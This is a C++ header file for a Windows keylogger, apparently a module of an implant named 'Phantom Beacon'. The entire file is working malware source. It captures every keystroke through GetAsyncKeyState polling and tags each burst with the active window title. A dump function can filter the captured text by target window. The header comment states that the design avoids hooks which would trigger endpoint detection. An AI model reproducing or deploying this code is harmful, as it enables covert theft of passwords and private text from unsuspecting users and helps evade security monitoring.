#pragma once
// ============================================================================
//  keylogger.h — Phantom Beacon Context-Aware Keylogger
//  ─────────────────────────────────────────────────────
//  Logs keystrokes. Uses GetAsyncKeyState in a background thread to avoid
//  global hooks (SetWindowsHookEx) which trigger EDRs.
// ============================================================================

#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <atomic>
#include <map>
#include <sstream>

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
    #endif
    #include <windows.h>
#else
    #include <chrono>
#endif

namespace keylogger {

// ── Shared State ───────────────────────────────────────────────────────────
inline std::mutex log_mutex;
inline std::string key_buffer;
inline std::atomic<bool> is_running{false};
inline std::thread kl_thread;
static std::map<int, bool> key_pressed;

#ifdef _WIN32
// ── Helper: Get Active Window Title ────────────────────────────────────────
inline std::string GetActiveWindowTitle() {
    HWND hForeground = GetForegroundWindow();
    if (!hForeground) return "Unknown Window";

    char title[256];
    if (GetWindowTextA(hForeground, title, sizeof(title))) {
        return std::string(title);
    }
    return "Untitled Window";
}

// ── Key Translation ────────────────────────────────────────────────────────
inline std::string TranslateKey(int vk, bool shift, bool caps) {
    if (vk >= 'A' && vk <= 'Z') {
        bool upper = (shift != caps);
        return upper ? std::string(1, (char)vk) : std::string(1, (char)(vk + 32));
    }
    if (vk >= '0' && vk <= '9') {
        if (!shift) return std::string(1, (char)vk);
        switch (vk) {
            case '1': return "!"; case '2': return "@"; case '3': return "#";
            case '4': return "$"; case '5': return "%"; case '6': return "^";
            case '7': return "&"; case '8': return "*"; case '9': return "(";
            case '0': return ")";
        }
    }
    switch (vk) {
        case VK_SPACE:   return " ";
        case VK_RETURN:  return "\n";
        case VK_BACK:    return "[BKSP]";
        case VK_TAB:     return "[TAB]";
        case VK_ESCAPE:  return "[ESC]";
        case VK_CONTROL: return "[CTRL]";
        case VK_MENU:    return "[ALT]";
        case VK_LBUTTON: return ""; 
        case VK_RBUTTON: return "";
        case VK_OEM_1:      return shift ? ":" : ";";
        case VK_OEM_PLUS:   return shift ? "+" : "=";
        case VK_OEM_COMMA:  return shift ? "<" : ",";
        case VK_OEM_MINUS:  return shift ? "_" : "-";
        case VK_OEM_PERIOD: return shift ? ">" : ".";
        case VK_OEM_2:      return shift ? "?" : "/";
        case VK_OEM_3:      return shift ? "~" : "`";
        case VK_OEM_4:      return shift ? "{" : "[";
        case VK_OEM_5:      return shift ? "|" : "\\";
        case VK_OEM_6:      return shift ? "}" : "]";
        case VK_OEM_7:      return shift ? "\"" : "'";
    }
    return "";
}

// ── Thread Loop ────────────────────────────────────────────────────────────
inline void KeyloggerLoop() {
    std::string lastTitle = "";
    
    // Reset key states
    for (int i = 0; i < 256; ++i) GetAsyncKeyState(i);

    while (is_running) {
        std::string currentTitle = GetActiveWindowTitle();

        if (currentTitle != lastTitle) {
            std::lock_guard<std::mutex> lock(log_mutex);
            key_buffer += "\n\n[Window: " + currentTitle + "]\n";
            lastTitle = currentTitle;
        }

        bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
        bool caps  = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

        for (int i = 8; i <= 255; i++) {
            bool is_down = (GetAsyncKeyState(i) & 0x8000) != 0;
            
            if (is_down) {
                if (!key_pressed[i]) { // Debounce
                    std::string key = TranslateKey(i, shift, caps);
                    if (key.empty() && i >= 32 && i <= 126) key = std::string(1, (char)i);
                    
                    if (!key.empty()) {
                        std::lock_guard<std::mutex> lock(log_mutex);
                        key_buffer += key;
                    }
                    key_pressed[i] = true;
                }
            } else {
                key_pressed[i] = false;
            }
        }
        
        Sleep(20);
    }
}

// ── Interface ──────────────────────────────────────────────────────────────
inline std::string dump(const std::string& filter = "") {
    std::lock_guard<std::mutex> lock(log_mutex);
    if (key_buffer.empty()) return "Buffer is empty. No keystrokes captured yet.";
    
    if (filter.empty()) {
        std::string out = "--- KEYLOG DUMP ---\n" + key_buffer + "\n--- END DUMP ---";
        key_buffer.clear();
        return out;
    }

    std::string filtered_out = "--- KEYLOG DUMP (Filter: " + filter + ") ---\n";
    std::string line;
    std::istringstream stream(key_buffer);
    bool in_target_window = false;

    while (std::getline(stream, line)) {
        if (line.find("[Window:") != std::string::npos) {
            in_target_window = (line.find(filter) != std::string::npos);
        } else if (in_target_window) {
            filtered_out += line + "\n";
        }
    }
    filtered_out += "--- END DUMP ---";
    return filtered_out;
}
#else
inline std::string start() { return "Keylogger not supported on this platform."; }
inline std::string stop() { return "Keylogger not supported."; }
inline std::string dump(const std::string& filter = "") { return "Keylogger not supported."; }
#endif

// ── Interface Start/Stop ──────────────────────────────────────────────────
#ifdef _WIN32
inline std::string start() {
    if (is_running) return "Keylogger is already running.";
    is_running = true;
    kl_thread = std::thread(KeyloggerLoop);
    kl_thread.detach();
    return "Keylogger started. Monitoring all keystrokes and windows.";
}

inline std::string stop() {
    if (!is_running) return "Keylogger is not running.";
    is_running = false;
    return "Keylogger stopped.";
}
#endif

} // namespace keylogger
